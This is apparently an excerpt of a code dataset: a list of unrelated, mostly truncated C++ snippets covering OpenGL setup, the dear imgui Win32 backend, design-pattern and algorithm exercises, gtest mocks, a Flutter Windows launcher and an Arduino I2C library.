compileShaders()\n{\n    shader = glCreateProgram();\n\n    if (!shader)\n    {\n        std::cout << \"Error creating shader program\\n\";\n        /* Note: Program could crash if shader fails to compile... so be more thorough here in the future */\n        return;\n    }\n\n    addShader(shader, vertexShader, GL_VERTEX_SHADER);\n    addShader(shader, fragmentShader, GL_FRAGMENT_SHADER);\n\n    int result = 0;\n    char errorLog[1024] = {};\n\n    // Creates executable on GPU using shaders\n    glLinkProgram(shader);\n    glGetProgramiv(shader, GL_LINK_STATUS, &result);\n\n    if (!result)\n    {\n        glGetProgramInfoLog(shader, sizeof(errorLog), nullptr, errorLog);\n        std::cout << \"Error linking program: \" << errorLog << '\\n';\n        return;\n    }\n\n    // Ensures that the shader was created correctly\n    glValidateProgram(shader);\n    glGetProgramiv(shader, GL_VALIDATE_STATUS, &result);\n\n    if (!result)\n    {\n        glGetProgramInfoLog(shader, sizeof(errorLog), nullptr, errorLog);\n        std::cout << \"Error validating program: \" << errorLog << '\\n';\n        return;\n    }\n\n    uniformModel = glGetUniformLocation(shader, \"model\");\n}\n\nint main()\n{\n    // Initialize GLFW\n    if (!glfwInit())\n    {\n        std::cout << \"GLFW failed to initialize\\n\";\n\n        // Unload GLFW memory\n        glfwTerminate();\n        return 1;\n    }\n\n    // Setup GLFW window properties\n    // OpenGL version\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n\n    // Core profile = no backwards compatibility\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, true);\n\n    // Cr",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32-bits AND 64-bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Mouse support. Can discriminate Mouse/TouchScreen/Pen.\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy VK_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// Configuration flags to add in your imconfig file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys, app back/forward keys.\n//  2023-09-25: Inputs: Synthesize key-down event on key-up for VK_SNAPSHOT / ImGuiKey_PrintScreen as Windows doesn't emit it (same behavior as GLFW/SDL).\n//  2023-09-07: Inputs: Added support for keyboard codepage conversion for when application is compiled in MBCS mode and using a non-Unicode window.\n//  2023-04-19: Added ImGui_ImplWin32_InitForOpenGL() to facilitate combining raw Win32/Winapi with OpenGL. (#3218)\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen/ImGuiMouseSource_Pen. (#2702)\n//  2023-02-15: Inputs: Use WM_NCMOUSEMOVE / WM_NCMOUSELEAVE to track mouse position over non-client area (e.g. OS decorations) when app is not focused. (#6045, #6162)\n//  2023-02-02: Inputs: Flipping WM_MOUSEHWHEEL (horizontal mouse-wheel) value to match other backends and offer consistent horizontal scrolling direction. (#4019, #6096, #1463)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-28: Inputs: Convert WM_CHAR values with MultiByteToWideChar() when window class was registered as MBCS (not Unicode).\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2021-01-20: Inputs: calling new io.AddKeyAnalogEvent() for gamepad support, instead of writing directly to io.NavInputs[].\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-17: Inputs: always update key mods next and before a key event (not in NewFrame) to fix input queue with very low framerates.\n//  2022-01-12: Inputs: Update mouse inputs using WM_MOUSEMOVE/WM_MOUSELEAVE + fallback to provide it when focused but not hovered/captured. More standard and will allow us to pass it to future input queue API.\n//  2022-01-12: Inputs: Maintain our own copy of MouseButtonsDown mask instead of using ImGui::IsAnyMouseDown() which will be obsoleted.\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\n//  2021-12-16: Inputs: Fill VK_LCONTROL/VK_RCONTROL/VK_LSHIFT/VK_RSHIFT/VK_LMENU/VK_RMENU for completeness.\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host window doesn't have focus.\n//  2021-07-29: Inputs: MousePos is correctly reported when the host platform window is hovered but not focused (using TrackMouseEvent() to receive WM_MOUSELEAVE events).\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-08: Fixed ImGui_ImplWin32_EnableDpiAwareness() and ImGui_ImplWin32_GetDpiScaleForMonitor() to handle Windows 8.1/10 features without a manifest (per-monitor DPI, and properly calls SetProcessDpiAwareness() on 8.1",
    "\ufeff#include <iostream>\n#include <string>\n#include <memory>\nusing namespace std;\n\nclass IDocument {\npublic:\n    virtual ~IDocument() = default;\n    virtual void open() = 0;\n    virtual void close() = 0;\n    virtual void read() = 0;\n};\n\nclass RealDocument : public IDocument {\nprivate:\n    string filename;\n    bool loaded;\n    string content;\n\n    void load() \n    {\n        cout << \"Loading document '\" << filename << \"'...\\n\";\n        content = \"This is the content of the document.\";\n        loaded = true;\n        cout << \"Document '\" << filename << \"' loaded.\\n\";\n    }\npublic:\n    RealDocument(const string& filename) : filename(filename), loaded(false) \n    {\n\n    }\n\n    void open() override \n    {\n        if (!loaded) \n        {\n            load();\n        }\n        cout << \"Document '\" << filename << \"' is opened.\\n\";\n    }\n\n    void close() override \n    {\n        cout << \"Document '\" << filename << \"' is closed.\\n\";\n    }\n\n    void read() override \n    {\n        if (!loaded) \n        {\n            load();\n        }\n        cout << \"Reading content: \" << content << '\\n';\n    }\n};\n\nclass DocumentProxy : public IDocument {\nprivate:\n    string filename;\n    unique_ptr<RealDocument> realDocument;\n\npublic:\n    DocumentProxy(const string& filename) : filename(filename), realDocument(nullptr) {}\n\n    void open() override \n    {\n        if (!realDocument) \n        {\n            realDocument = make_unique<RealDocument>(filename);\n        }\n        realDocument->open();\n    }\n\n    void close() override \n    {\n        if (realDocument) \n        {\n            realDocument->close();\n        }\n    }\n\n    void read() override \n    {\n        if (!realDocument) \n        {\n            realDocument = make_unique<RealDocument>(filename);\n        }\n        realDocument->read();\n    }\n};\n\nvoid client(IDocument& document) \n{\n    document.open();\n    document.read();\n    document.close();\n}\n\nint main() {\n    DocumentProxy proxy(\"test_document.txt\");\n    client(proxy);\n}",
    "class Solution {\npublic:\n    int f(int i, int D ,vector<int>&coins,vector<vector<int>>&dp){\n        //base \n        if(i==0) {\n            if(D%coins[0]==0) return 1;\n            return 0;\n        }\n        \n        \n        if(dp[i][D]!=-1) return dp[i][D];\n        int notpick = f(i-1,D,coins,dp);\n        \n       int pick  = 0;\n        if(D>=coins[i]){\n            pick = f(i,D-coins[i],coins,dp);\n        }\n        dp[i][D] =  pick + notpick;\n        \n        \n        return dp[i][D];\n        \n        \n        \n    }\n    int change(int amount, vector<int>& coins) {\n        int n = coins.size();\n        vector<int> prev(amount+1,0),cur(amount+1,0);\n        for(int T=0;T<=amount;T++) {\n           prev[T] = (T%coins[0]==0);\n        }\n        \n        for(int i =1;i<n;i++){\n            for(int D = 0;D<=amount;D++){\n                \n                int notpick = prev[D];\n        \n                int pick  = 0;\n                if(D>=coins[i]) pick = cur[D-coins[i]];\n                cur[D] = pick+notpick;\n        }\n            prev = cur;\n    }\n        return prev[amount];\n    }\n};",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pr9\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<simplecpp>\nmain_program\n{\nint n[1000],k;\ncin>>k;\nfor(int i=0;i<k;i++)\n\t {int j;\n\t cin>>j;\n\t n[i]=j;\n\t }\nint a[1000],b[1000];\nint q=k,w=0,y=0,u=0;\nfor(int i=0;i<k;i++)\n\t {\n\t if(k%2==0)\n\t\t  {\n\t\t  if(n[w]>n[q])\n\t\t  \t{\n\t\t\ta[y]=n[w];\n\t\t\ty=y+1;\n\t\t\tw=w+1;\n\t\t\t}\n\t\t  else\n\t\t\t    {\n                        a[y]=n[q];\n                        y=y+1;\n                        q=q-1;\n                        }\n\t\t  }\n\t else\n\t                   {\n                  if(n[w]>n[q])\n                        {\n                        b[u]=n[w];\n                        u=u+1;\n                        w=w+1;\n                        }\n                  else\n                            {\n                        b[u]=n[q];\n                        u=u+1;\n                        q=q-1;\n                        }\n                  }\n\t }\nint sum1=0,sum2=0;\nfor(int i=0;i<=y;i++)\n\tsum1=sum1+a[i];\nfor(int i=0;i<=u;i++)\n        sum2=sum2+b[i];\nif(sum1>sum2)\n\tcout<<\"a is the winner\";\nelse if (sum2>sum1)\n        cout<<\"b is the winner\";\nelse\n\tcout<<\"draw\";\n}\n",
    "// Implemente a classe Funcionario com nome, salario e os m\u00e9todos\n// addAumento(double valor), ganhoAnual() e exibeDados() - imprime os valores do\n// funcion\u00e1rio.\n// a. crie a classe Assistente, que tamb\u00e9m \u00e9 um funcion\u00e1rio, e que possui um\n// n\u00famero de matr\u00edcula (fa\u00e7a os m\u00e9todos GET e SET). Sobrescreva o m\u00e9todo\n// exibeDados().\n// b. sabendo que os Assistentes T\u00e9cnicos possuem um b\u00f4nus salarial e que os\n// Assistentes Administrativos possuem um turno (dia ou noite) e um adicional\n// noturno, crie as classes Tecnico e Administrativo e sobrescreva o m\u00e9todo\n// ganhoAnual() de ambas as classes (Administrativo e Tecnico).\n\n#include <iostream>\n\nclass Funcionario{\n\n    public:\n        Funcionario(){}\n        ~Funcionario(){}\n\n        void setSalario(float _salario){\n            salario = _salario;\n        }\n\n        void setNome(std::string _nome){\n            nome = _nome;\n        }\n\n        float getSalario(float salario){\n            return salario;\n        }\n\n        float addAumento(float salario){\n            float aumento;\n            std::cout << \"Digite o valor do aumento: \";\n            std::cin >> aumento;\n            salario += aumento;\n            setSalario(salario);\n            return salario;\n        }\n\n        void ganhoAnual(float salario){\n            std::cout << \"Seu sal\u00e1rio anual \u00e9 \" << salario * 12 << \" reais.\\n\";\n        }\n\n        void exiDados(std::string nome, float salario){\n            std::cout << \"Seu nome \u00e9 \" << nome << \", tendo um sal\u00e1rio de \" << getSalario(salario) << \" reais, ganhando \" << salario * 12 << \" reais anualmente.\\n\";\n        }\n\n    protected:\n        std::string nome;\n        float salario;\n};\n\nclass Assistente : public Funcionario{\n\n    public:\n        Assistente(){}\n        ~Assistente(){}\n\n        void setMatricula(int _matricula){\n            matricula = _matricula;\n        }\n\n        int getMatricula(int matricula){\n            return matricula;\n        }\n\n        void exiDados(int matricula,std::string nome, float salario){\n            Funcionario::exiDados(nome,salario);\n            std::cout << \"Sua matr\u00edcula \u00e9 \" << getMatricula(matricula) << \".\\n\";\n        }\n\n    protected:\n        int matricula;\n\n};\n\nclass Tecnico : public Assistente{\n    public:\n        Tecnico(){}\n        ~Tecnico(){}\n\n        void setBonus(float _bonus){\n            bonus = _bonus;\n        }\n\n        float adicionarBonus(){\n            std::cout << \"Digite seu b\u00f4nus salarial: \";\n            std::cin >> bonus;\n            salario += bonus;\n            setBonus(bonus);\n            Funcionario::setSalario(salario);\n        }\n\n        void ganhoAnual(float salario){\n            Funcionario::ganhoAnual(salario);\n            std::cout << \"J\u00e1 que voc\u00ea \u00e9 assistente t\u00e9cnico.\";\n        }\n\n        void exiDados(std::string nome, float salario, int matricula){\n            Assistente::exiDados(matricula,nome,salario);\n            std::cout << \"Voc\u00ea \u00e9 assistente t\u00e9cnico, por isso ganha um b\u00f4nus salarial de \" << bonus << \"reais.\";\n        }\n\n\n\n    private:\n        float bonus;\n\n};\n\nclass Administrativo : public Assistente{\n\n    public:\n        Administrativo(){}\n        ~Administrativo(){}\n\n        void setTurno(char _turno){\n            turno = _turno;\n        }\n\n        void setBonusN(float _bonusN){\n            bonusN = _bonusN;\n        }\n\n        void ganhoAnual(float salario){\n            Funcionario::ganhoAnual(salario);\n            std::cout << \"J\u00e1 que voc\u00ea \u00e9 assistente administrativo.\";\n        }\n\n        void bonusNoturno(){\n            std::cout << \"Digite o seu b\u00f4nus salarial: \";\n            std::cin >> bonusN;\n            setBonusN(bonusN);\n            salario += bonusN;\n            Funcionario::setSalario(salario);\n        }\n\n        void exiDados(std::string nome,float salario,int matricula,char turno){\n            std::string arrumarTurno;\n            Assistente::exiDados(matricula,nome,salario);\n            std::cout << \"Voc\u00ea \u00e9 assistente administrativo.\";\n             if(turno == 'n'){\n                arrumarTurno = 'noite';\n                std::cout << \"Trabalhando no turno da noite, por isso ganha um b\u00f4nus salarial de \" << bonusN << \" reais.\";\n            }\n               else{\n                 arrumarTurno = 'dia';\n                 std::cout << \"Trabalhando no turno do dia\";\n            }\n        }\n\n    private:\n        char turno;\n        float bonusN;\n};\n\nint main(){\n    Funcionario funcionario;\n    Assistente assistente;\n    Administrativo administrativo;\n    Tecnico tecnico;\n    std::string nome;\n    char turno;\n    float salario;\n    int matricula;\n    int i = 1, a, b;\n    std::cout << \"Digite seu nome: \";\n    std::cin >> nome;\n    std::cout << \"Digite seu sal\u00e1rio: \";\n    std::cin >> salario;\n    funcionario.setSalario(salario);\n    funcionario.setNome(nome);\n    std::cout << \"\\n\u00c9 um Assistente? 1 (sim), 0 (n\u00e3o): \";\n    std::cin >> a;\n\n    if(a == 1){\n        std::cout << \"Digite sua matr\u00edcula: \";\n        std::cin >> matricula;\n        assistente.setMatricula(matricula);\n       ",
    "#include \"Account.h\"\n#include \"Transaction.h\"\n#include <gtest/gtest.h>\n#include <gmock/gmock.h>\n#include <stdexcept>\nclass MTransaction : public Transaction {\n public:\n  MTransaction() : Transaction() {}\n  MOCK_METHOD(void, SaveToDataBase, (Account& from, Account& to, int sum), (override));\n};\n\nclass MAccount : public Account {\n private:\n  int id;\n  int balance;\n public:\n  MAccount(int id, int balance) : Account(id, balance) {}\n  MOCK_METHOD(int, GetBalance, (), (const, override));\n  MOCK_METHOD(void, ChangeBalance, (int), (override));\n  MOCK_METHOD(void, Lock, (), (override));\n  MOCK_METHOD(void, Unlock, (), (override));\n};\n\n\nTEST(Account, function) {\n  Account aone(1, 1000);\n  EXPECT_EQ(1000, aone.GetBalance());\n  aone.Lock();\n  aone.ChangeBalance(2000);\n  aone.Unlock();\n  EXPECT_EQ(3000, aone.GetBalance());\n  try {\n    aone.ChangeBalance(1);\n  }\n  catch (std::runtime_error& el) {}\n  EXPECT_EQ(3000, aone.GetBalance());\n}\n\nTEST(Transaction, function) {\n  Account aone(1, 10000);\n  Account atwo(2, 10000);\n  Transaction tr;\n  Transaction tr2; tr2.set_fee(500);\n  try {tr.Make(aone, aone, 100);}\n  catch (std::logic_error& el) {}\n  try {tr.Make(aone, atwo, -100);}\n  catch (std::invalid_argument& el) {}\n  try {tr.Make(aone, atwo, 0);}\n  catch (std::logic_error& el) {}\n  EXPECT_EQ(false, tr2.Make(aone, atwo, 200));\n  tr.Make(aone, atwo, 1999);\n  EXPECT_EQ(aone.GetBalance(), 10000); EXPECT_EQ(atwo.GetBalance(), 9999);\n}\nTEST(Transactio2n, d2) {\n  Account aone(1, 10000);\n  Account atwo(2, 10000);\n  Transaction tr;\n  try {\n  EXPECT_NE(true, tr.Make(aone, atwo, -200));}\n  catch (std::invalid_argument& el) {std::cout << \"test done\";}\n}\nusing ::testing::AtLeast;\n\nTEST(Account, Mock) {\n  MAccount aone(1, 1000);\n  EXPECT_CALL(aone, GetBalance()).Times(AtLeast(1));\n  std::cout <<  aone.GetBalance() << std::endl;\n  EXPECT_CALL(aone, Lock()).Times(AtLeast(1));\n  aone.Lock();\n  EXPECT_CALL(aone, ChangeBalance(1)).Times(AtLeast(1));\n  aone.ChangeBalance(1);\n  EXPECT_CALL(aone, Unlock()).Times(AtLeast(1));\n  aone.Unlock();\n  \n}\n\nTEST(Transaction, Mock) {\n  Account aone(1, 10000);\n  Account atwo(2, 10000);\n  MTransaction tr;\n  EXPECT_CALL(tr, SaveToDataBase(aone, atwo, 1999)).Times(AtLeast(1));\n  tr.Make(aone, atwo, 1999);\n  \n  \n}\n\n",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n\n#include <cstdio>\n#include \"Vector.h\"\n#include \"Queue.h\"\n\nvoid merge(int* degreeS, int left, int mid, int right) {\n    int n1 = mid - left + 1;\n    int n2 = right - mid;\n\n    int* L = new int[n1];\n    int* R = new int[n2];\n\n    for (int i = 0; i < n1; i++)\n        L[i] = degreeS[left + i];\n    for (int i = 0; i < n2; i++)\n        R[i] = degreeS[mid + 1 + i];\n    int i = 0, j = 0, k = left;\n    while (i < n1 && j < n2) {\n        if (L[i] >= R[j]) {\n            degreeS[k] = L[i];\n            i++;\n        }\n        else {\n            degreeS[k] = R[j];\n            j++;\n        }\n        k++;\n    }\n    while (i < n1) {\n        degreeS[k] = L[i];\n        i++;\n        k++;\n    }\n    while (j < n2) {\n        degreeS[k] = R[j];\n        j++;\n        k++;\n    }\n    delete[] L;\n    delete[] R;\n}\n\nvoid mergeSort(int* degreeS, int left, int right) {\n    if (left < right) {\n        int mid = left + (right - left) / 2;\n        mergeSort(degreeS, left, mid); // sorting left site of data\n        mergeSort(degreeS, mid + 1, right); // sorting right site of data\n\n        merge(degreeS, left, mid, right); // merging both site of data\n    }\n}\n\nvoid DFS(const Vector<Vector<int>>& graph, Vector<int>& visited, int vertex) {\n    visited[vertex] = 1;\n    int tempSize = graph[vertex].size();\n    for (int i = 0; i <tempSize ; i++) {\n        int neighbor = graph[vertex].get(i);\n        if (!visited[neighbor - 1])\n            DFS(graph, visited, neighbor - 1);\n    }\n}\n\nint countComponents(const Vector<Vector<int>>& graph, int numberOfVertices) {\n    Vector<int> visited;\n    visited.fill(0, numberOfVertices);\n    int componentCount = 0;\n\n    for (int i = 0; i < numberOfVertices; i++) {\n        if (!visited.get(i)) {\n            DFS(graph, visited, i);\n            componentCount++; // counting how many time we have to start DFS algorithm to visit every vertex;\n        }\n    }\n    return componentCount;\n}\n\nbool isBipartite(const Vector<Vector<int>>& graph, int startingVertex, Vector<int>& color) {\n    Queue<int> q;\n    q.push(startingVertex);\n    color.push(1, startingVertex);\n    while (!q.empty()) {\n        int vertex = q.frontElement();\n        q.pop();\n        int currentColor = color[vertex];\n        int nextColor = (currentColor == 1) ? 2 : 1;\n        for (int i = 0; i < graph[vertex].size(); i++) {\n            int neighbor = graph[vertex][i] - 1;\n            if (color[neighbor] == 0) {\n                color.push(nextColor, neighbor);\n                q.push(neighbor);\n            }\n            else if (color[neighbor] == currentColor) { // if neighbor of current vertex has been colored by the same color graph is not bipartite\n                return false;\n            }\n        }\n    }\n    return true;\n}\n\nbool isGraphBipartite(const Vector<Vector<int>>& graph, int numberOfVertices) {\n    Vector<int> color;\n    color.fill(0, numberOfVertices);\n    for (int i = 0; i < numberOfVertices; i++) {\n        if (color[i] == 0) {\n            if (!isBipartite(graph, i, color))\n                return false;\n        }\n    }\n    return true; // if we manage to colore graph usigng 2 colors graph is bipartite\n}\n\nvoid BFS(const Vector<Vector<int>>& graph, Vector<int>& distance, int vertex, int numberOfVertices) {\n    Queue<int> q;\n    Vector<int> visited;\n    visited.fill(0, numberOfVertices);\n    q.push(vertex);\n    visited[vertex] = 1;\n    distance[vertex] = 0;\n\n    while (!q.empty()) {\n        int v = q.frontElement();\n        q.pop();\n        for (int i = 0; i < graph[v].size(); i++) {\n            int neighbour = graph[v][i] - 1;\n            if (!visited[neighbour]) {\n                visited[neighbour] = 1;\n                distance[neighbour] = distance[v] + 1;\n                q.push(neighbour);\n            }\n        }\n    }\n}\n\nvoid eccentricities(const Vector<Vector<int>>& graph, int numberOfVertices) {\n    Vector<Vector<int>> distance;\n    Vector<int> temp;\n    distance.reserve(numberOfVertices);\n    temp.fill(-1, numberOfVertices);\n    for (int i = 0; i < numberOfVertices; i++) {\n        distance.push(temp);\n    }\n    for (int i = 0; i < numberOfVertices; i++) {\n        int eccentricity = 0;\n        if(graph[i].size() > 0){\n            if(distance[i][0] == -1)\n                BFS(graph, distance[i], i, numberOfVertices);\n            for (int k = 0; k < numberOfVertices; k++) {\n                if (distance[i][k] != -1) {\n                    if (eccentricity < distance[i][k])\n                        eccentricity = distance[i][k];\n                }\n            }\n        }\n        printf(\"%d \", eccentricity);\n    }\n}\n\nbool isGraphPlanarBasic(int numberOfVertices, int numberOfEdges) {\n    return numberOfEdges <= 3 * numberOfVertices - 6;\n}\n\n\n//tarjan's algorithm for planarity check\nbool isPlanarAlgorithm(Vector<Vector<int>>& graph, int numberOfVertices, int vertex, int parent, Vector<int>& visited, Vector<int>& entry, Vector<int> low, int& time, Vector<int> stack, Vector<bool> inStack) {\n    visited[vertex] = 1;\n    ",
    "// I2Cdev library collection - Main I2C device class\n// Abstracts bit and byte I2C R/W functions into a convenient class\n// 2013-06-05 by Jeff Rowberg <jeff@rowberg.net>\n//\n// Changelog:\n//      2021-09-28 - allow custom Wire object as transaction function argument\n//      2020-01-20 - hardija : complete support for Teensy 3.x\n//      2015-10-30 - simondlevy : support i2c_t3 for Teensy3.1\n//      2013-05-06 - add Francesco Ferrara's Fastwire v0.24 implementation with small modifications\n//      2013-05-05 - fix issue with writing bit values to words (Sasquatch/Farzanegan)\n//      2012-06-09 - fix major issue with reading > 32 bytes at a time with Arduino Wire\n//                 - add compiler warnings when using outdated or IDE or limited I2Cdev implementation\n//      2011-11-01 - fix write*Bits mask calculation (thanks sasquatch @ Arduino forums)\n//      2011-10-03 - added automatic Arduino version detection for ease of use\n//      2011-10-02 - added Gene Knight's NBWire TwoWire class implementation with small modifications\n//      2011-08-31 - added support for Arduino 1.0 Wire library (methods are different from 0.x)\n//      2011-08-03 - added optional timeout parameter to read* methods to easily change from default\n//      2011-08-02 - added support for 16-bit registers\n//                 - fixed incorrect Doxygen comments on some methods\n//                 - added timeout value for read operations (thanks mem @ Arduino forums)\n//      2011-07-30 - changed read/write function structures to return success or byte counts\n//                 - made all methods static for multi-device memory savings\n//      2011-07-28 - initial release\n\n/* ============================================\nI2Cdev device library code is placed under the MIT license\nCopyright (c) 2013 Jeff Rowberg\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n===============================================\n*/\n\n#include \"I2Cdev.h\"\n\n#if I2CDEV_IMPLEMENTATION == I2CDEV_ARDUINO_WIRE || I2CDEV_IMPLEMENTATION == I2CDEV_BUILTIN_SBWIRE\n\n    #ifdef I2CDEV_IMPLEMENTATION_WARNINGS\n        #if ARDUINO < 100\n            #warning Using outdated Arduino IDE with Wire library is functionally limiting.\n            #warning Arduino IDE v1.6.5+ with I2Cdev Fastwire implementation is recommended.\n            #warning This I2Cdev implementation does not support:\n            #warning - Repeated starts conditions\n            #warning - Timeout detection (some Wire requests block forever)\n        #elif ARDUINO == 100\n            #warning Using outdated Arduino IDE with Wire library is functionally limiting.\n            #warning Arduino IDE v1.6.5+ with I2Cdev Fastwire implementation is recommended.\n            #warning This I2Cdev implementation does not support:\n            #warning - Repeated starts conditions\n            #warning - Timeout detection (some Wire requests block forever)\n        #elif ARDUINO > 100\n            /*#warning Using current Arduino IDE with Wire library is functionally limiting.\n            #warning Arduino IDE v1.6.5+ with I2CDEV_BUILTIN_FASTWIRE implementation is recommended.\n            #warning This I2Cdev implementation does not support:\n            #warning - Timeout detection (some Wire requests block forever)*/\n        #endif\n    #endif\n\n#elif I2CDEV_IMPLEMENTATION == I2CDEV_BUILTIN_FASTWIRE\n\n    //#error The I2CDEV_BUILTIN_FASTWIRE implementation is known to be broken right now. Patience, Iago!\n\n#elif I2CDEV_IMPLEMENTATION == I2CDEV_BUILTIN_NBWIRE\n\n    #ifdef I2CDEV_IMPLEMENTATION_WARNINGS\n        #warning Using I2CDEV_BUILTIN_NBWIRE implementation may adversely affect interrupt detection.\n        #warning This I2Cdev implementation does not support:\n        #warning - Repeated starts conditions\n    #endif\n\n    // NBWire implementation based heavily on code by Gene Knight <Gene@Telobot.com>\n    // Originally posted on the Arduino forum at http://arduino.cc/forum/index.php/topic,70705.0.html\n    // Originally offered to the i2cdevlib project at http://arduino.cc/forum/index.php/t",
    "#include <iostream>\r\n#include <vector>\r\n#include <unordered_map>\r\nusing namespace std;\r\n \r\n// Una clase para representar un conjunto disjunto\r\nclass DisjointSet\r\n{\r\n    unordered_map<int, int> parent;\r\n \r\npublic:\r\n \r\n    // realizar la operaci\u00f3n MakeSet\r\n    void makeSet(vector<int> const &universe)\r\n    {\r\n        // crear `n` conjuntos disjuntos (uno para cada elemento)\r\n        for (int i: universe) {\r\n            parent[i] = i;\r\n        }\r\n    }\r\n \r\n    // Encuentra la ra\u00edz del conjunto al que pertenece el elemento `k`\r\n    int Find(int k)\r\n    {\r\n        // si `k` es root\r\n        if (parent[k] == k) {\r\n            return k;\r\n        }\r\n \r\n        // recurre para el padre hasta que encontramos la ra\u00edz\r\n        return Find(parent[k]);\r\n    }\r\n \r\n    // Realizar Uni\u00f3n de dos subconjuntos\r\n    void Union(int a, int b)\r\n    {\r\n        // encontrar la ra\u00edz de los conjuntos a los que pertenecen los elementos `x` e `y`\r\n        int x = Find(a);\r\n        int y = Find(b);\r\n \r\n        parent[x] = y;\r\n    }\r\n};\r\n \r\nvoid printSets(vector<int> const &universe, DisjointSet &ds)\r\n{\r\n    for (int i: universe) {\r\n        cout << ds.Find(i) << \" \";\r\n    }\r\n    cout << endl;\r\n}\r\n \r\n// Estructura de datos Disjoint\u2013Set (algoritmo Union\u2013Find)\r\nint main()\r\n{\r\n    // universo de elementos\r\n    vector<int> universe = { 1, 2, 3, 4, 5 };\r\n \r\n    // inicializa la clase `DisjointSet`\r\n    DisjointSet ds;\r\n \r\n    // crea un conjunto singleton para cada elemento del universo\r\n    ds.makeSet(universe);\r\n    printSets(universe, ds);\r\n \r\n    ds.Union(4, 3);        // 4 y 3 est\u00e1n en el mismo conjunto\r\n    printSets(universe, ds);\r\n \r\n    ds.Union(2, 1);        // 1 y 2 est\u00e1n en el mismo conjunto\r\n    printSets(universe, ds);\r\n \r\n    ds.Union(1, 3);        // 1, 2, 3, 4 est\u00e1n en el mismo conjunto\r\n    printSets(universe, 